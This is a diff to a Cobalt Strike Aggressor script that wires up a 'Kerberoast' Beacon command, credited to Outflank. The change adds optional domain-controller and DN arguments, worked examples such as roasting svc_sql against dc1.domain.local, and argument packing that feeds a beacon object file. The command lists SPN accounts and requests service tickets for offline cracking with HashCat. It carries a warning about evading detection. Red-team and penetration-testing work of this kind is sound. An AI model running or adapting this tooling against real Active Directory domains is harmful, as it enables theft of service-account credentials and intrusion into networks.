@@ -5,8 +5,10 @@
 #register help
 beacon_command_register("Kerberoast", "Perform Kerberoasting against all (or specified) SPN enabled accounts.",
 	"List all SPN enabled user/service accounts or request service tickets (TGS-REP) which can be cracked offline using HashCat.\n\n" .
-	"Synopsis: Kerberoast [list, list-no-aes, roast or roast-no-aes] [account <optional sAMAccountName filter (default all)>]\n\n" .
-	"WARNING: Listing and roasting tickets without sAMAccountName filter is OPSEC UNSAFE!\n\n");
+	"Synopsis: Kerberoast [list, list-no-aes, roast or roast-no-aes] [account <optional sAMAccountName filter (default all)>] [DC hostname/IP <optional, roast only>] [DN <optional, roast only>]\n" .
+	"Example 1: Kerberoast roast svc_sql \n" .
+	"Example 2: Kerberoast roast svc_sql dc1.domain.local CN=domain,CN=local 	\n\n" .
+	"WARNING: Listing users without sAMAccountName filter is OPSEC UNSAFE!\n\n");
 
 alias Kerberoast {
 	$bid = $1;
@@ -16,6 +18,8 @@ alias Kerberoast {
 
 	$action = @args[0];
 	$filter = @args[1];
+	$dc = @args[2];
+	$dn = @args[3];
 
 	if ($action eq "") {
 		berror($bid, "Please specify an action (list, list-no-aes, roast or roast-no-aes).");
@@ -27,14 +31,18 @@ alias Kerberoast {
 	$data   = readb($handle, -1);
 	closef($handle);
 
-	# Pack our arguments
-	if ($filter eq "") {
-		$arg_data  = bof_pack($bid, "Z", $action);
-	}
-	else {
-		$arg_data  = bof_pack($bid, "ZZ", $action, $filter);
-	}
+    # Pack our arguments
+    if ($filter eq "") {
+        $arg_data  = bof_pack($bid, "Z", $action);
+    } else if ($dc eq "") {
+        $arg_data  = bof_pack($bid, "ZZ", $action, $filter);
+    } else if ($dn eq "") {
+        $arg_data  = bof_pack($bid, "ZZZ", $action, $filter, $dc);
+    } else {
+        $arg_data  = bof_pack($bid, "ZZZZ", $action, $filter, $dc, $dn);
+    }
 
 	blog($bid, "Kerberoast BOF by Outflank");
 	beacon_inline_execute($bid, $data, "go", $arg_data);
 }
+
